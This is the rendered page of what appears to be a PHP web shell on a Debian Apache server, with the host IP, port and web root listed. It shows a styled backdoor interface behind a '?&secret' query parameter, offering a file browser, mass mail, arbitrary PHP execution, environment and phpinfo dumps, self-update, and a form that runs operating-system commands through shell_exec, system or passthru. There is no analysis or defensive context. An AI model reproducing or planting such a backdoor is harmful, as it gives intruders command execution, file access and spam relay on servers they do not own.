<center><table border="1" width=600 rules="groups">

  <thead>
    <tr><td><img  src=??&secret&dir&pic=o.b height= width=>Apache/2.4.56 (Debian)<br>132.232.103.235:8081<br>webmaster@localhost<br>Linux<br>Start_dir:&ensp;&ensp;&ensp;<a href=??&secret&file_browser&file=%2Fvar%2Fwww%2Fhtml>/var/www/html</a><br></td>
<style type="text/css">
body { background-color:#8B8989;font-family:trebuchet Ms; color:black }

textarea {
border-top-width: 1px; 
font-weight: bold; 
border-left-width: 1px; 
font-size: 10px; 
border-left-color: #8B8989; 
background:#8B8989; 
border-bottom-width: 1px; 
border-bottom-color:#8B8989; 
color: black; 
border-top-color:#8B8989; 
font-family: trebuchet Ms; 
border-right-width: 1px; 
border-right-color: #8B8989;
}
input {
border-top-width: 1px; 
font-weight: bold; 
border-left-width: 1px; 
font-size: 10px; 
border-left-color: #8B8989; 
background: #8B8989; 
border-bottom-width: 1px; 
border-bottom-color: #8B8989; 
color: black; 
border-top-color:#8B8989; 
font-family: trebuchet Ms; 
border-right-width: 1px; 
border-right-color:#8B8989;
}
td {
    font-size: 10px; 
    font-family: verdana;
}
th {
    font-size: 10px; 
    font-family: verdana;
}
a:link {
    text-decoration: none;
}
a:visited {
    text-decoration: none;
        color:blue;
}
a:active {
    text-decoration: none;
}
a:hover {
    color: #00ff00; 
    text-decoration: none;
}
back {
background-color:grey;
}
 ul#Navigation {
position:absolute;
    width: 10em;
    margin: 0; padding: 0.8em;
    border: 1px solid #8B8989;
    background-color: #8B8989;
  }
  * html ul#Navigation {  /* Korrekturen fuer IE 5.x */
    width: 11.6em;
    w\idth: 10em;
    padding-left: 0;
    padd\ing-left: 0.8em;
  }
  ul#Navigation li {
    list-style: none;
    margin: 0.4em; padding: 0;
  }

  ul#Navigation a {
    display:block;
    padding: 0.2em;
    text-decoration: none; font-weight: bold;
    border: 1px solid black;
    border-left-color: black; border-top-color: black;
    color: black; background-color: #8B8989;
  }
  * html ul#Navigation a {  /* Breitenangaben nur fuer IE */
    width: 100%;
    w\idth: 8.8em;
  }
  ul#Navigation a:hover {
    border-color: white;
    border-left-color: black; border-top-color: black;
    color: white; background-color: #8B8989;
  }
</style>






<html>
  <ul id="Navigation">
    <li><a href=?&secret&file_browser&file=.>File_Browser</a></li>
    <li><a href=?&secret&send_mail>Send Mail(s)</a></li>

    <li><a href=?&secret&php_code>php_code</a></li>
    <li><a href=?&secret&crypt>crypter</a></li>
    <li><a href=?&secret&php_info>php_info()</a></li>
    <li><a href=?&secret&defined_vars>defined_vars()</a></li>
    <li><a href=?&secret&env>env()</a></li>

    <li><a href=?&secret&update>update()</a></li>
  </ul>
<center><table border="1" rules="groups">
  <thead>
    <tr>
     <th></th>
       <td>
<form action=??&secret&exec_st method="post">

<input type="submit" name="sub" value="Execute"><br>
<br>
<input type="text" name="command">
<br>
<input type="radio" name="method" value="1">shell_exec();
<input type="radio" name="method" value="2">system();
<input type="radio" name="method" value="3">passthru();
<input type="radio" name="method" value="4">automatic();<br>
<textarea name="exec" rows=15 cols=90>
</textarea>